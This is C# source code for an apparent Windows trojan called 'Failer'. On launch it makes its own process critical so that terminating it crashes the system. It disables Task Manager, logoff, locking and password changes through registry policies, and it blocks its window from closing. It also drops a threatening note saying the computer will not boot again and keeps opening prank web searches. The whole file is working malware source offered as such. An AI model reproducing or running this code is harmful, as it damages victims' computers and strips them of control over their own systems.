using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Failer
{
    public partial class Payloads : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Payloads()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;

        private void Payloads_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        private void Payloads_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
            key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
            key.SetValue("DisableLogoff", 1, RegistryValueKind.DWord);
            key.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
            timer1.Start();
            timer2.Start();
            // Get the path to the local app data folder
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Create the file path for note.txt
            string filePath = Path.Combine(localAppData, "note.txt");

            // If exist to delete
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
            }

            // Write some text to the file
            using (StreamWriter writer = File.AppendText(filePath))
            {
                writer.WriteLine("YOUR COMPUTER HAS BEEN TRASHED BY Failer TROJAN");
                writer.WriteLine("");
                writer.WriteLine("your computer won't boot up again.");
                writer.WriteLine("So use it long time if you can!");
                writer.WriteLine(":D");
                writer.WriteLine("");
                writer.WriteLine("if you try to kill Failer will");
                writer.WriteLine("destroy your computer now!");
                writer.WriteLine("");
                writer.WriteLine("Source by Jammin");
            }
            // Open the file with the default text editor
            System.Diagnostics.Process.Start(filePath);
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            int true_num = r.Next(10);
            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how to delete Failer trojan?");
            }
            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how to overwrite my mbr?");
            }
            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=if delete system to what happen?");
            }
            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=I HATE SCHOOL");
            }
            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how 2 make trojan?");
            }
            if (true_num == 6)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=HOW 2 DOWNLOAD FAILER.exe TROJAN?");
            }
            if (true_num == 7)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=Thank you soo much! :>");
            }
            if (true_num == 8)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=INFECTED BY Failer TROJAN HELP ME!");
            }
            if (true_num == 9)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how 2 overwrite LogonUI.exe?");
            }
            if (true_num == 10)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=Failer trojan is bad trojan");
            }
            timer1.Start();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            var NewForm = new Failer_Sound();
            NewForm.ShowDialog();
        }
    }
}
